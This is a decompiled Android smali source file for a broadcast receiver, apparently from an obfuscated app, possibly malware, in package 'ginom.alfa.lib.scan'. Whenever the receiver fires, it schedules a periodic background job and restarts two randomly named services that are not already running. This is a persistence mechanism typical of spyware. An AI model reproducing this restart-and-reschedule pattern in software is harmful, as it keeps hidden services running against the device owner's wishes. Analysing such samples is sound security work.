.class public Lginom/alfa/lib/scan/SensorRestarterBroadcastReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SensorRestarterBroadcastReceiver.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 11
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static scheduleJob(Landroid/content/Context;)V
    .locals 4

    const-string v0, "jobscheduler"

    .line 40
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/job/JobScheduler;

    .line 41
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 43
    sget p0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x64

    const/16 v3, 0x18

    if-lt p0, v3, :cond_0

    .line 45
    new-instance p0, Landroid/app/job/JobInfo$Builder;

    invoke-direct {p0, v2, v1}, Landroid/app/job/JobInfo$Builder;-><init>(ILandroid/content/ComponentName;)V

    const-wide/32 v1, 0xdbba0

    .line 46
    invoke-virtual {p0, v1, v2}, Landroid/app/job/JobInfo$Builder;->setPeriodic(J)Landroid/app/job/JobInfo$Builder;

    move-result-object p0

    .line 47
    invoke-virtual {p0}, Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;

    move-result-object p0

    goto :goto_0

    .line 49
    :cond_0
    new-instance p0, Landroid/app/job/JobInfo$Builder;

    invoke-direct {p0, v2, v1}, Landroid/app/job/JobInfo$Builder;-><init>(ILandroid/content/ComponentName;)V

    const-wide/16 v1, 0x3a98

    .line 50
    invoke-virtual {p0, v1, v2}, Landroid/app/job/JobInfo$Builder;->setPeriodic(J)Landroid/app/job/JobInfo$Builder;

    move-result-object p0

    .line 51
    invoke-virtual {p0}, Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;

    move-result-object p0

    .line 53
    :goto_0
    invoke-virtual {v0, p0}, Landroid/app/job/JobScheduler;->schedule(Landroid/app/job/JobInfo;)I

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1

    .line 17
    :try_start_0
    invoke-static {p1}, Lginom/alfa/lib/scan/SensorRestarterBroadcastReceiver;->scheduleJob(Landroid/content/Context;)V

    const-string p2, "01110001"

    .line 18
    sput-object p2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->p_etepaejhucdoifemyubbjerbt13_r:Ljava/lang/String;

    sput-object p2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->p_etepaejhucdoifemyubbjerbt13_r:Ljava/lang/String;

    .line 21
    const-class p2, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;

    invoke-static {p2, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt110;->_runn_srv_(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p2

    if-eqz p2, :cond_0

    .line 24
    new-instance p2, Landroid/content/Intent;

    const-class v0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 28
    :cond_0
    const-class p2, Lginom/alfa/lib/scan/xyxieqqhgkvmzrkvuldqgwuyc3;

    invoke-static {p2, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt110;->_runn_srv_(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p2

    if-eqz p2, :cond_1

    .line 30
    new-instance p2, Landroid/content/Intent;

    const-class v0, Lginom/alfa/lib/scan/xyxieqqhgkvmzrkvuldqgwuyc3;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    return-void
.end method
